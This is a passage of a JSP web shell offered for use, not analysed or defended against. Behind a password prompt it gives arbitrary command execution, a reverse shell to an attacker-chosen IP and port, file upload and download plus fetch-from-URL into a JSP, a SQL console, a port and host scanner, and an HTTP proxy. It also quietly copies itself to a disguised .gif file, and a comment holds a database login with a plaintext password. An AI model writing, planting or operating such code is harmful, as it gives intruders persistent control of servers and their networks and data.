                        int n = bis.read(buffer);
                        String browserRequest = new String(buffer, 0, n);
                        System.out.println(browserRequest);
                        // extract the host to connect to
                        int start = browserRequest.indexOf("Host: ") + 6;
                        int end = browserRequest.indexOf('\n', start);
                        String host = browserRequest.substring(start, end - 1);
                        // forward the response from the proxy to the server
                        String hosts[]=host.split(":");
                        int port=80;
                        if(hosts.length>1){
                                host=hosts[0];
                                port=Integer.parseInt(hosts[1].trim());
                        }
                        Socket hostSocket = new Socket(host, port);
                        OutputStream sos = hostSocket.getOutputStream();
                        System.out.println("Forwarding request to server");
                        sos.write(buffer, 0, n);
                        sos.flush();
                        // forward the response from the server to the browser
                        InputStream sis = hostSocket.getInputStream();
                        OutputStream bos = clientSocket.getOutputStream();
        
                        System.out.println("Forwarding request from server");
                        
                        int readcount=0;	
                        int leftToRead=-1;
                        n = sis.read(buffer);
                        if(n>0)
                        {
                                bos.write(buffer, 0, n);
                                int lenStart=indexOfString(buffer,"Content-Length: ",0);
                                
                                if(lenStart>=0)
                                {
                                        lenStart+=16;
                                        int lenEnd=indexOfString(buffer,"\r",lenStart);
                                        int length=lenEnd-lenStart;
                                        
                                        //System.out.println(lenStart+"-"+lenEnd);
                                        int contentLength=Integer.parseInt(new String(buffer,lenStart,length));
                                        
                                        System.out.println(contentLength);
                                        
                                        // only read contentLength things
                                        int headerLength=indexOfString(buffer,"\r\n\r\n",0)+4;
                                        leftToRead=contentLength-(n-headerLength);
                                        
                                        System.out.println("leftToRead="+leftToRead);
                                        
                                        while(leftToRead>0)
                                        {
                                                n=sis.read(buffer);
                                                if(n>0)
                                                {
                                                        bos.write(buffer, 0, n);
                                                        leftToRead-=n;
                                                }
                                                else
                                                        break;
                                        }
                                }
                                else
                                {
                                        int encStart=indexOfString(buffer,"Transfer-Encoding: ",0);
                                        
                                        if(encStart>=0)
                                        {
                                                encStart+=19;
                                                int encEnd=indexOfString(buffer,"\r",encStart);
                                                int encLength=encEnd-encStart;
                                                
                                                String encType=new String(buffer,encStart,encLength);
                                                if(encType.equals("chunked"))
                                                {
                                                        System.out.println("this chunked");
                                                        
                                                        int chunkSizeStart=indexOfString(buffer,"\r\n\r\n",0)+4;
                                                        int chunkSizeEnd=indexOfString(buffer,"\r",chunkSizeStart);
                                                        int chunkSize=0;
                                                        if(chunkSizeStart==n){
                                                                n=sis.read(buffer);
                                                                bos.write(buffer,0,n);
                                                                chunkSizeEnd=indexOfString(buffer,"\r",0);
                                                                System.out.println(n+" "+ chunkSizeStart+" "+chunkSizeEnd);
                                                                chunkSize=Integer.parseInt(new String(buffer, 0, chunkSizeEnd-0).trim(),16);
                                                        }else{
                                                                System.out.println(n+" "+ chunkSizeStart+" "+chunkSizeEnd);
                                                                chunkSize=Integer.parseInt(new String(buffer, chunkSizeStart, chunkSizeEnd-chunkSizeStart).trim(),16);
                                                        }
                                                        
                                                        
                                                        while(chunkSize>0)
                                                        {
                                                                System.out.println("chunkSizeStart:"+chunkSizeStart);
                                                                
                                                                chunkSizeStart=chunkSizeEnd+2+chunkSize+2;
                                                                
                                                                System.out.println("chunkSizeStart:"+chunkSizeStart);
                                                                
                                                                if(chunkSizeStart<n)
                                                                {
                                                                        chunkSizeEnd=indexOfString(buffer,"\r",chunkSizeStart);
                                                                        chunkSize=Integer.parseInt(new String(buffer, chunkSizeStart, chunkSizeEnd-chunkSizeStart),16);
                                                                }
                                                                else
                                                                {
                                                                        
                                                                        do
                                                                        {
                                                                                chunkSizeStart=chunkSizeStart-n;
                                                                                System.out.println("chunkSizeStart:"+chunkSizeStart);
                                                                                n=sis.read(buffer);
                                                                                bos.write(buffer, 0, n);
                                                                                //System.out.println(new String(buffer,0,n));
                                                                        }
                                                                        while(chunkSizeStart>=n);
                                                                        chunkSizeEnd=indexOfString(buffer,"\r",chunkSizeStart);
                                                
                                                                        chunkSize=Integer.parseInt(new String(buffer, chunkSizeStart, chunkSizeEnd-chunkSizeStart),16);
                                                                        
                                                                }
                                                        }
                                                        
                                                }
                                        }
                                }
                        }
                        bos.flush();
                        hostSocket.close();
                        clientSocket.close();
                        System.out.println("End of communication");
                        
                }
                catch (IOException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                }
        }
}
public int indexOfString(byte[] buffer, String str, int start)
{
        byte[] strbytes=str.getBytes();
        
        for(int i=start;i<buffer.length-strbytes.length;i++)
        {
                boolean find=true;
                
                for(int j=0;j<strbytes.length;j++)
                {
                        if(buffer[i+j]!=strbytes[j])
                        {
                                find=false;
                                break;
                        }
                }
                
                if(find)
                        return i;
        }
        
        return -1;
}
public class SeverProxy extends Thread{
        public ServletContext context;
        public int port=1080;
        public SeverProxy(ServletContext context,int port){
                this.context=context;
                this.port=port;
        }
        public void run(){
                try {
                        ServerSocket socket = new ServerSocket(port);
                        //ExecutorService pool = Executors.newFixedThreadPool(10);
                        context.setAttribute("proxy_socket", socket);
                        while(true){
                                Socket client=socket.accept();
                                //pool.execute(new ProxyClient(client));
                                //new ProxyClient(client).start();
                                new SubProxyServer(client).start();
                        }
                } catch (Exception e) {
                        e.printStackTrace();
                }
        }
}
public void testProxy(ServletContext context,int port){
        new SeverProxy(context,port).start();
}
public class ProxyModel{
        public String host;
        public int port;
        public String content;
}
public class BackProxy{
        ProxyModel model;
        public BackProxy(ProxyModel model){
                this.model=model;
        }
        public void run(){
                
        }
        public void write(OutputStream out,String data)throws Exception{
                out.write(data.getBytes());
                out.flush();
        }
        public void readAndResponse(InputStream sis,OutputStream bos){
                /*POST /shell/jspmanage.jsp?module=proxy&action=back_proxy&host=192.168.1.251&port=80 HTTP/1.1
                                Host: 127.0.0.1:8888
                                User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
                                Accept: text/html,application/xhtml+xml,application/xml;q=0.9;q=0.8
                                Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
                                Accept-Encoding: gzip, deflate
                                Cookie: JSESSIONID=F21454160694FFBA90B680FB5697924D; M0l_cookietime=2592000
                                X-Forwarded-For: 8.8.8.8
                                Connection: keep-alive
                                Content-Type: application/x-www-form-urlencoded
                                Content-Length: 11
                */
                try{
                byte[] buffer = new byte[1000000];
                
                int readcount=0;	
                int leftToRead=-1;
                int n = sis.read(buffer);
                
                if(n>0)
                {
                        bos.write(buffer, 0, n);
                        int lenStart=indexOfString(buffer,"Content-Length: ",0);
                        
                        if(lenStart>=0)
                        {
                                lenStart+=16;
                                int lenEnd=indexOfString(buffer,"\r",lenStart);
                                int length=lenEnd-lenStart;
                                
                                //System.out.println(lenStart+"-"+lenEnd);
                                int contentLength=Integer.parseInt(new String(buffer,lenStart,length).trim());
                                
                                
                                // only read contentLength things
                                int headerLength=indexOfString(buffer,"\r\n\r\n",0)+4;
                                leftToRead=contentLength-(n-headerLength);
                                
                                
                                while(leftToRead>0)
                                {
                                        n=sis.read(buffer);
                                        if(n>0)
                                        {
                                                bos.write(buffer, 0, n);
                                                leftToRead-=n;
                                        }
                                        else
                                                break;
                                }
                        }
                        else
                        {
                                int encStart=indexOfString(buffer,"Transfer-Encoding: ",0);
                                
                                if(encStart>=0)
                                {
                                        encStart+=19;
                                        int encEnd=indexOfString(buffer,"\r",encStart);
                                        int encLength=encEnd-encStart;
                                        
                                        String encType=new String(buffer,encStart,encLength);
                                        if(encType.equals("chunked"))
                                        {
                                                
                                                int chunkSizeStart=indexOfString(buffer,"\r\n\r\n",0)+4;
                                                int chunkSizeEnd=indexOfString(buffer,"\r",chunkSizeStart);
                                                int chunkSize=0;
                                                if(chunkSizeStart==n){//
                                                        n=sis.read(buffer);
                                                        bos.write(buffer,0,n);
                                                        chunkSizeEnd=indexOfString(buffer,"\r",0);
                                                        chunkSize=Integer.parseInt(new String(buffer, 0, chunkSizeEnd-0).trim(),16);
                                                }else{
                                                        chunkSize=Integer.parseInt(new String(buffer, chunkSizeStart, chunkSizeEnd-chunkSizeStart).trim(),16);
                                                }
                                                while(chunkSize>0)
                                                {
                                                        chunkSizeStart=chunkSizeEnd+2+chunkSize+2;
                                                        if(chunkSizeStart<n)
                                                        {
                                                                chunkSizeEnd=indexOfString(buffer,"\r",chunkSizeStart);
                                                                chunkSize=Integer.parseInt(new String(buffer, chunkSizeStart, chunkSizeEnd-chunkSizeStart),16);
                                                        }
                                                        else
                                                        {
                                                                do
                                                                {
                                                                        chunkSizeStart=chunkSizeStart-n;
                                                                        n=sis.read(buffer);
                                                                        bos.write(buffer, 0, n);
                                                                }
                                                                while(chunkSizeStart>=n);
                                                                chunkSizeEnd=indexOfString(buffer,"\r",chunkSizeStart);
                                        
                                                                chunkSize=Integer.parseInt(new String(buffer, chunkSizeStart, chunkSizeEnd-chunkSizeStart),16);
                                                                
                                                        }
                                                }
                                                
                                        }
                                }
                        }
                }
            }catch (Exception e) {
                        e.printStackTrace();
                }
        }
        public String readHead(InputStream in)throws Exception{
                String data="";
                StringBuffer sb=new StringBuffer();
                try {
                        BufferedReader br=new BufferedReader(new InputStreamReader(in));
                        int content_length=0;
                        while((data=br.readLine())!=null){
                                if(data.equals("")) break;
                                sb.append(data+"\r\n");
                                if(data.startsWith("Content-Length:")){
                                        String lenstr[]=data.split(": ");
                                        if(lenstr.length>1){
                                                content_length = Integer.parseInt(lenstr[1].trim());
                                        }
                                }
                        }
                        sb.append("\r\n");
                        if(content_length>0){
                                byte[] bt=new byte[content_length];
                                for(int i=0;i<content_length;i++){
                                        bt[i]=(byte) br.read();
                                }
                                sb.append(new String(bt)+"\r\n");
                        }
                        
                } catch (Exception e) {
                        throw e;
                }
                return sb.toString();
        }
}
/*
class TrustManager implements X509TrustManager {
         TrustManager() {
         
            }
         
            public void checkClientTrusted(X509Certificate chain[], String authType) throws CertificateException {
                System.out.println("");
            }
            public void checkServerTrusted(X509Certificate chain[], String authType) throws CertificateException {
                System.out.println("");
            }
         
            //
            public X509Certificate[] getAcceptedIssuers() {
                System.out.println("");
                return null;
            }
        }
*/
%>


<div>
<%
        String webroot = "";
        if(application.getRealPath("/")==null){
             webroot=request.getSession().getServletContext().getResource("/").getPath();
        }else{
                webroot=application.getRealPath("/");
        }
        String s_path="";
        if(request.getRealPath("")==null){
        	s_path = webroot+request.getServletPath();
        }else{
        	s_path=request.getRealPath("")+request.getServletPath();
        }

        String s_back_name="nnn.gif";
        String ss = "";
        if(application.getRealPath("/")==null){
                ss = webroot+"/image/"+s_back_name;
        }else{
                ss=application.getRealPath("/")+"image/"+s_back_name;
        }
        File bf=new File(ss);
        if(!bf.exists()){
                copyFile(s_path,ss);
        }
%>
<%  

String requestURI=request.getRequestURI();
String module=getParam(request, "module").equals("")?"file":getParam(request, "module");
String action=getParam(request, "action");
String error = getParam(request, "error").equals("")?"":getParam(request, "error");
if(module.equals("login")){
        String pwd=getParam(request, "u_password");
        if(pwd.equals(pass_word)){
                session.setAttribute("u_password", pwd);
        }
        sendRedirect(response, requestURI+"?");
}
%>
<%
if(getSession(session, "u_password").equals("")||!getSession(session, "u_password").equals(pass_word)){//login
%>
        <form action="?module=login"method="post">
                <input type="password" name="u_password">
                <input type="submit" value="go">
        </form>
        <%=request.getSession().getServletContext().getRealPath("")+request.getServletPath()+"xxxx"%>
<%
}else{

if(module.equals("file")){
        action=action.equals("")?"listfile":action;
}else if(module.equals("database")){
        action=action.equals("")?"sqlshell":action;
}
String path=getParam(request, "path").equals("")?webroot:getParam(request, "path");
path=new String(path.getBytes("ISO-8859-1"),"utf-8");//
%>
<div style="background-color: rgb(228, 166, 166);color:white;width:900px">
<span><a href="?module=file&action=listfile">file manager</a></span>|
<span><a href="?module=shell">cmd shell</a></span>|
<span><a href="?module=database&action=sqlshell">database manager</a></span>|
<span><a href="?module=system&action=show">system info</a></span>|
<span><a href="?module=backshell">back shell</a></span>|
<span><a href="?module=networkscan">network scan</a></span>|
<span><a href="?module=evalcode">eval code</a></span>
</div>
<hr/>
<span><%=getSession(session, "error") %><%session.setAttribute("error", ""); %></span>
<!-- system module start -->
<%
if(module.equals("system")){ 
        String osName = getSystemProperty("os.name");
        String osVersion = getSystemProperty("os.version");
        String javaVersion = getSystemProperty("java.version");
        String userName = getSystemProperty("user.name");
        String javaHome = getSystemProperty("java.home");
        String serverInfo=application.getServerInfo();
        String ip=getIpAddress();
%>	
<%if(action.equals("show")){ %>
                <div id="file_content">
                    <li>os name:&nbsp;<%=osName %></li>
                    <li>os version:&nbsp;<%=osVersion %></li>
                    <li>java version:&nbsp;<%=javaVersion %></li>
                    <li>java home:&nbsp;<%=javaHome %></li>
                    <li>user name:&nbsp;<%=userName %></li>
                    <li>serverInfo:&nbsp;<%=serverInfo %></li>
                    <li>ip:&nbsp;<%=ip %></li>
                </div>
        <%} %>
<%} %>
<!-- system module end -->
<!-- backshell module start -->
<%if(module.equals("backshell")){ %>
        <div id="file_content">

             <form action="?module=backshell&action=conn"method="post">
             	your ip:<input type="text" name="ip"value="<%=getSession(session, "back_ip")%>">
             	your port:<input type="text" name="port"value="<%=getSession(session, "back_port")%>">
             	Program:<input type="text" name="pro"value="<%=getSession(session, "back_pro").replaceAll("\"", "&quot;")%>">
             	arguments:<input type="text" name="arg"value="<%=getSession(session, "back_arg").replaceAll("\"", "&quot;")%>">
             	<input type="submit"value="go">
             	<!-- /c C:\Program" "Files\MySQL\MySQL" "Server" "5.6\bin\mysql.exe -uroot -p5201314 -->
             </form>
        </div>
        <%if(action.equals("conn")){ 
                Cmd cmd=new Cmd();
                String yip=getParam(request, "ip");
                int yport=Integer.parseInt(getParam(request, "port"));
                String pro=getParam(request, "pro");
                String arg=getParam(request, "arg");
                session.setAttribute("back_ip", yip);
                session.setAttribute("back_port", yport);
                session.setAttribute("back_pro", pro);
                session.setAttribute("back_arg", arg);
                try{
                        cmd.backShell(yip, yport, pro, arg);
                        error+="success!";
                }catch(Exception e){
                        error+=e.getMessage();
                }
                session.setAttribute("error", error);
                sendRedirect(response, requestURI+"?module=backshell");
        %>
        <%} %>
<%} %>
<!-- backshell module end -->

<!-- file_manager module start -->
<%

if(module.equals("file")){
        File curfile = new File(path);
        String parent_file = "";
        

        if(curfile.exists()){
                parent_file=curfile.getParent()==null?"c:/":curfile.getParent();
        }
        if(action.equals("listfile")){
                List<FileModel> files= null;
                try{
                        files=listFile(path);
                }catch(Exception e){
                        error+=e.toString();
                }
%>
<div id="file_content">
<p style="margin: 0;">current_path：<%=path %></p>
<div id="pan">
<span><a href="?action=listfile&path=c:/">c:</a></span>
<span><a href="?action=listfile&path=d:/">d:</a></span>
<span><a href="?action=listfile&path=e:/">e:</a></span>
<span><a href="?action=listfile&path=f:/">f:</a></span>
<span><a href="?action=listfile&path=g:/">g:</a></span>
</div>

<span style="color:red"><%=new String(error.getBytes("ISO-8859-1"),"utf-8") %></span>
<form action="?action=listfile">
        <input style="width:800px;" name="path" type="text" value="<%=path.replaceAll("\"", "&quot;")%>">
        <input type="submit" value="go">
</form>
<div id="">
        <table class="table-css">
         <tr>
                <td>
                	<a href="?action=listfile&path=<%=URLEncoder.encode(parent_file,"utf-8")%>">parent</a>
                     
                </td>
                <td>
                     <form action="?action=upfile&path=<%=URLEncoder.encode(path,"utf-8")%>" method="post" enctype="multipart/form-data">
                             	<input type="file" name="filename">
                             	<input type="submit" value="uplpad">
                     </form>
                </td>
                <td>
                </td>
                <td>
                     <a href="?action=addpath&path=<%=URLEncoder.encode(path,"utf-8")%>"onclick="path=prompt('file path','');if(path===null){return false;}else{this.href+='&c_path='+path;return true;}">create path</a>
                </td>
                <td>
                 <form action="?action=loadFile&path=<%=URLEncoder.encode(path,"utf-8")%>" method="post">
                                url:<input style="width:250px" name="url" type="text" value="<%=getSession(session, "load_url")%>">
                                fname:<input style="width:50px" name="fname" type="text" value="a.jsp">
                                <input type="submit" value="load">
                     </form>
                </td>
         </tr>
         <tr>
         	<td>name</td>
         	<td>Last Modified</td>
         	<td>Size(kb)</td>
         	<td>Read/Write/Execute</td>
         	<td></td>
         </tr>
        <%
        for(FileModel it:files){
                //String str[]=it.split("\\|\\|\\|");
        %>
             
                <tr>
                        <td>
                        <%
                            if(it.is_file){
                        %>
                        	<a target="_blank" href="?action=view&path=<%=URLEncoder.encode(it.path,"utf-8")%>"><%=it.name %></a>
                        <%
                            }else{
                        %>
                                <a href="?action=listfile&path=<%=URLEncoder.encode(it.path,"utf-8")%>"><%=it.name %></a>
                        <%
                            }
                        %>
                        </td>
                        <td><%=it.last_mod %></td>
                        <td><%=it.size %></td>
                        <td><%=it.can_read+"|"+it.can_write+"|"+it.can_exec%></td>
                        <td>
                         <%if(it.is_file){ %>
                                 <a target="_blank" href="?action=view&path=<%=URLEncoder.encode(it.path,"utf-8")%>">view</a>||
                         	 <a href="?action=download&path=<%=URLEncoder.encode(it.path,"utf-8")%>">download</a>
                         	 || <a href="?action=delete&path=<%=URLEncoder.encode(it.path,"utf-8")%>"onclick="if(!confirm('are you sure delete？')){return false;}">delete</a>
                         <%}else{%>
                         	<a href="?action=download&path=<%=URLEncoder.encode(it.path,"utf-8")%>">pack</a>
                         	|| <a href="?action=delete&path=<%=URLEncoder.encode(it.path,"utf-8")%>" onclick="if(!confirm('are you sure delete？')){return false;}">delete</a>
                         <%} %>
                            || <a href="?action=rename&path=<%=URLEncoder.encode(it.path,"utf-8")%>"onclick="name=prompt('rename the file', '<%=it.name%>');this.href+='&name='+name;if(name=='null'){return false}else{return true;}">rename</a>
                        </td>
                </tr>
        <%
        }
     %>
<%}else if(action.equals("download")) {

        File mf = new File(path);
        if(mf.isFile()){
                 response.setContentType("application/x-download");//
                 String filedownload = path;
                 String filedisplay = mf.getName();
                 filedisplay = URLEncoder.encode(filedisplay,"UTF-8");
                 response.addHeader("Content-Disposition","attachment;filename=" + filedisplay);
                 BufferedInputStream bis = null;
                 OutputStream os =null;
                 try
                 {
                	 os = response.getOutputStream();
                	 bis = new BufferedInputStream(new FileInputStream(filedownload));
                	 byte[] b = new byte[1024];
                         int i = 0;
                         while((i = bis.read(b)) > 0)
                         {
                        	  os.write(b, 0, i);
                         }
                         os.flush();
                 }
                 catch(Exception e)
                 {
                         e.printStackTrace();
                         error+=e.getMessage();
                 }
                 finally
                 {
                	 os.close();
                	 bis.close();
                	 out.clear();   
                         out = pageContext.pushBody();
                 }
        }else{
                String name=new File(path).getName();
                String tempFile=parent_file+"/"+name+".zip";
                File temf=new File(tempFile);
                doZip(path, tempFile);
                sendRedirect(response,requestURI+"?action=listfile&path="+URLEncoder.encode(parent_file,"utf-8"));
        }
%>
<%}else if(action.equals("delete")){
        delete(path);
        sendRedirect(response,requestURI+"?action=listfile&path="+URLEncoder.encode(parent_file,"utf-8"));
    }else if(action.equals("view")){
            FileManage fm = new FileManage();
            String data = fm.getContent(path);
            data= data.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
         %>
         	<div id="file_content"><pre><%=data %></pre></div>
         <%
    }else if(action.equals("upfile")){
%>
<%
try{
        upload(request,path);
}catch(Exception e){
        error+=e.getMessage();
}
sendRedirect(response,requestURI+"?action=listfile&path="+URLEncoder.encode(path,"utf-8")+"&error="+URLEncoder.encode(error,"utf-8"));
%>
<%} else if(action.equals("addpath")){
        String c_path=request.getParameter("c_path");
        try{
        if(c_path!=null&&!c_path.trim().equals("")){
                File file = new File(path+"/"+c_path);
                if(!file.exists()){
                        file.mkdirs();
                }
        }
        }catch(Exception e){
                error+=e.getMessage();
        }finally{
                sendRedirect(response,requestURI+"?action=listfile&path="+URLEncoder.encode(path,"utf-8")+"&error="+URLEncoder.encode(error,"utf-8"));
        }
%>
<%}else if(action.equals("rename")){
        String name = getParam(request, "name");
        if(rename(path, parent_file+"/"+name)){
                error+="success!";
        }else{
                error+="error";
        }
        sendRedirect(response,requestURI+"?action=listfile&path="+URLEncoder.encode(parent_file,"utf-8")+"&error="+URLEncoder.encode(error,"utf-8"));
} %>
<%if(action.equals("loadFile")){ 
        String furl=getParam(request, "url");
        String fname=getParam(request, "fname");
        try{
        session.setAttribute("load_url", furl);
        FileManage fm = new FileManage();
        fm.createFile(furl, path, fname, false);
        }catch(Exception e){
                error+=e.getMessage();
        }
        sendRedirect(response,requestURI+"?action=listfile&path="+URLEncoder.encode(path,"utf-8")+"&error="+URLEncoder.encode(error,"utf-8"));
%>
        
<%} %>

</table>
</div>
<div>
</div>
<!-- file_manager module end -->

<!-- shell module start -->
<%}else if(module.equals("shell")){
        String cur_pro = getParam(request, "pro");
        String cur_arg = getParam(request, "arg");
        if(cur_pro.equals("")){
                cur_pro="cmd.exe";
        }
        if(cur_arg.equals("")){
                cur_arg="/c net user";
        }
%>
<div id="shell">
        <form action="?module=shell&action=exec" method="get">
                <input type="hidden" name="module" value="shell">
                <input type="hidden" name="action" value="exec">
                Program:<input style="width:100px;background-color:black;color:white" name="pro" type="text" value="<%=cur_pro.replaceAll("\"", "&quot;")%>">
                arguments:<input style="width:400px;background-color:black;color:white" name="arg" type="text" value="<%=cur_arg.replaceAll("\"", "&quot;")%>">
                <input style="display: none" type="submit" value="go">
        </form>
        <div id="result">
                <%if(action.equals("exec")){
                	Cmd cmd = new Cmd();
                	List<String> lcmd=cmd.exec(cur_pro, cur_arg);
                        for(String s:lcmd){
                        	%>
                        		<%=s %>
                        	<%
                	}
                 %>
                <%} %>
        </div>
</div>
<!-- shell module end -->
<!-- database mudule start -->
<%}else if(module.equals("database")){
     String schema = getParam(request, "schema");
     if(!schema.equals("")){
             session.setAttribute("sql_schema", schema);
     }
     System.out.println(schema);
        %>
<div id="shell_sql">
        <span><a href="?module=database&action=sqlshell">sql shell</a></span>|
        <%if(!getSession(session,"sql_name").equals("")){ %>
        <span><a href="?module=database&action=info">database info</a></span>
        <%} %>
        <form action="?module=database&action=config"method="post">
                driver:<input id="sql_driver" type="text"name="driver"value="<%=getSession(session, "sql_driver")%>">
                url:<input id="sql_url" type="text"name="url"value="<%=getSession(session, "sql_url")%>">
                user:<input id="sql_user" type="text"name="name"value="<%=getSession(session, "sql_name")%>">
                pwd:<input id="sql_pwd" type="password"name="password"value="<%=getSession(session, "sql_password")%>">
                <select name="sql_type" id="sql_select">
                     <%!String sel="selected='selected'"; 
                            public String selected(String session_value,String value){
                                    if(session_value.equals(value)){
                                            return sel;
                                    }
                                    return "";
                            }
                     %>
                        <option value="">---select type---</option>
                        <option <%=selected(getSession(session, "sql_type"),"mysql") %> value="mysql">mysql</option>
                        <option <%=selected(getSession(session, "sql_type"),"oracle") %> value="oracle">oracle</option>
                        <option <%=selected(getSession(session, "sql_type"),"sqlserver") %> value="sqlserver">sql server</option>
                        <option <%=selected(getSession(session, "sql_type"),"access") %> value="access">access</option>
                        <option <%=selected(getSession(session, "sql_type"),"other") %> value="other">other</option>
                </select>
                <input type="submit"value="conn">
        </form>
        <script>
                $(document).ready(function(){
                     $("#sql_select").change(function(){
                                var configs={
                                        "mysql":{"sql_driver":"com.mysql.jdbc.Driver","sql_url":"jdbc:mysql://localhost:3306/mysql?useUnicode=true&characterEncoding=utf-8"},
                                        "oracle":{"sql_driver":"oracle.jdbc.driver.OracleDriver","sql_url":"jdbc:oracle:thin:@dbhost:1521:ORA1"},
                                        "sqlserver":{"sql_driver":"com.microsoft.sqlserver.jdbc.SQLServerDriver","sql_url":"jdbc:sqlserver://localhost:1433;DatabaseName=master"},
                                        "access":{"sql_driver":"sun.jdbc.odbc.JdbcOdbcDriver","sql_url":"jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:\ccc.mdb"},
                                        "other":{"sql_driver":"","sql_url":""}
                                };
                                var config=configs[this.value];
                                $("#sql_driver").val(config["sql_driver"]);
                                $("#sql_url").val(config["sql_url"]);
                     });
                     if('<%=getSession(session, "sql_driver")%>'==""){
                     		$("#sql_select").change();
                     }
                });
        </script>
        <%
        if(action.equals("export")){
             String sql = getParam(request, "sql");
             sql=new String(sql.getBytes("ISO-8859-1"),"utf-8");
                SqlManager manager=new SqlManager(session);
                manager.getConnection();
                manager.export(request, response, session,sql);
                manager.close();
                out = pageContext.pushBody();
                sendRedirect(response,requestURI+"?module=database&action=sqlshell");
        }
        if(action.equals("view")){
                String table_name = getParam(request, "table_name");
                table_name = new String(table_name.getBytes("ISO-8859-1"),"utf-8");
                SqlManager manager=new SqlManager(session);
                
        }
        if(action.equals("config")){
                session.setAttribute("sql_driver", getParam(request, "driver"));
                session.setAttribute("sql_url", getParam(request, "url"));
                session.setAttribute("sql_name", getParam(request, "name"));
                session.setAttribute("sql_password", getParam(request, "password"));
                session.setAttribute("sql_type", getParam(request, "sql_type"));
                schema="";
                session.setAttribute("sql_schema", schema);
                SqlManager manager=new SqlManager(session);
                try{
                        manager.getConnection();
                        if(manager.conn!=null){
                                error+="success!";
                        }
                }catch(Exception e){
                        error+=e.toString();
                }finally{
                        manager.close();
                        session.setAttribute("error", error);
                }
                sendRedirect(response,requestURI+"?module=database&action=sqlshell");
        }else if(action.equals("info")){
                SqlManager manager=new SqlManager(session);
                manager.getConnection();
                SqlManager.DatabaseInfo info=manager.getDatabseinfo(schema);
                manager.close();
        %>
                <span>sql version:<%=info.varsion %></span>
                <span>
                
                </span>
                <script>
                $(document).ready(function(){
                     $(".table_name").click(function(){
                             $(this).parent().next().toggle();
                     });
                     $("#database").change(function(){
                             location.href="?module=database&action=info&schema="+$(this).val();
                     });
                });
                </script>
                <select id="database">
                <option value="">---select database---</option>
                     <%for(String item:info.databases){ %>
                     	<option value="<%=item%>"><%=item %></option>
                     <%} %>
                </select>
                <table>
                     <tr>
                     		<td>TABLE_NAME</td>
                     		<td>TABLE_CAT</td>
                     		<td>TABLE_SCHEM</td>
                     		<td>TABLE_TYPE</td>
                     		<td>REMARKS</td>
                     		<td></td>
                     </tr>
                <%int index=0; %>
                 <%for(SqlManager.Table tb:info.tables) {%>
                     <tr>
                                 <td class="table_name" data_id="<%=index%>">
                                     <%=tb.TABLE_NAME %>
                                 </td>
                                 <td class="table_name">
                                     <%=tb.TABLE_CAT%>
                                 </td>
                                 <td class="table_name">
                                     <%=tb.TABLE_SCHEM %>
                                 </td>
                                 <td class="table_name">  
                                     <%=tb.TABLE_TYPE %>
                                 </td>
                                 <td class="table_name">
                                     <%=tb.REMARKS==null?"":tb.REMARKS %>
                                 </td>
                                 <td>
                                    <span><a target="_blank" href="?module=database&action=sqlshell&sql=select%20*%20from%20<%=tb.TABLE_NAME%>">view</a></span>|
                                    <span><a href="?module=database&action=export&sql=select%20*%20from%20<%=tb.TABLE_NAME%>">export</a></span>
                                 </td>
                     </tr>
                     <tr class="hiddent_tr">
                            <td colspan="6">
                                 <table>
                                 <tr><td>COLUMN_NAME</td><td>TYPE_NAME</td><td>COLUMN_SIZE</td><td>REMARKS</td></tr>
                                    <%for(SqlManager.Column s:tb.columns){ %>
                                    <tr>
                                        <td><%=s.COLUMN_NAME %></td>
                                        <td><%=s.TYPE_NAME %></td>
                                        <td><%=s.COLUMN_SIZE %></td>
                                        <td><%=s.REMARKS %></td>
                                     <tr>
                                    <%} %>
                            	 </table>
                             </td>
                        </tr>
             <%index++; }  %>
            </table>
     <%}else if(action.equals("sqlshell")){
             String sql = getParam(request, "sql");
             sql=new String(sql.getBytes("ISO-8859-1"),"utf-8");
            %>
                <form action="?module=database&action=sqlshell" method="post">
                sql:<input style="width:1020px;background-color:black;color:white" name="sql" type="text" value="<%=sql%>">
                                <input style="display: none" type="submit" value="go">
                                <input type="button" onclick="$(this).parent().attr('action','?module=database&action=export');submit();$(this).parent().attr('action','?module=database&action=sqlshell');" value="export">
                </form>
                
                <div id="result_sql">
                     <%
                     if(!sql.equals("")){
                             SqlManager m = new SqlManager(session);
                             SqlManager.DataModel model= null;
                             try{
                            	  m.getConnection();
                            	  if(!sql.toLowerCase().startsWith("select")){
                            	     model=m.execute(sql);
                            	  }else{
                            		 model=m.query(sql);
                            	  }
                            	  m.close();
                             }catch(Exception e){
                                    error+=e.toString();
                                    
                             }finally{
                                     m.close();
                             }
                             %>
                             <table>
                             <%if(!error.equals("")) {%>
                                     <tr><td><%=error %></td></tr>
                             <%} %>
                             <%
                             if(model!=null){
                                     %>
                                     
                                     <tr>
                                     <%for(String c:model.column){%>
                                         <td><%=c %></td>
                                     <%}%>
                                     </tr>
                                     <%for(Map<String,String> mtemp:model.datas){ %>
                                     <tr>
                                     	  <%for(String name:model.column){ %>
                                     	  	 <td><%=mtemp.get(name).replaceAll("<", "&lt;").replaceAll(">","&gt;") %></td>
                                     	  <%} %>
                                     <tr>
                                     <%} %>
                                <%}%>
                             </table>
                         <%} %>
                </div>
        </div>
        </div>
        <%
     }
} %>
<!-- database mudule end -->
<!-- networkScan mudule start -->
<%if(module.equals("networkscan")) {
        if(getSession(session, "curent_host").equals("")){
                session.setAttribute("curent_host", "127.0.0.1");
        }
        if(getSession(session, "port_def").equals("")){
                session.setAttribute("port_def", "21,25,80,110,143,1433,1723,27017,28017,3306,3389,4899,5631,8080,8888,8011,43958,65500,28888");
        }
        NetWorkScaner scaner = new NetWorkScaner();
        String scan_host=getParam(request, "scan_host");
        String scan_port=getParam(request, "scan_port");
        if(!scan_host.equals("")){
                session.setAttribute("curent_host", scan_host);
        }
        if(!scan_port.equals("")){
                session.setAttribute("port_def", scan_port);
        }
        if(session.getAttribute("alive_host")==null){
                session.setAttribute("alive_host", new ArrayList<String>());
        }
%>
<%=getSession(session, "error") %>
<%session.setAttribute("error", ""); %>
<div id="result">
        <span><a href="?module=networkscan&action=alive_scan">alive scan</a></span>|
        <span><a href="?module=networkscan&action=port_scan">port scan</a></span>|
        <span><a href="?module=networkscan&action=http_proxy">http proxy</a></span>|
        <span><a href="?module=networkscan&action=back_proxy">back proxy</a></span>
        <%if(action.equals("alive_scan")) {
                List<String> alive_host=scaner.scan();
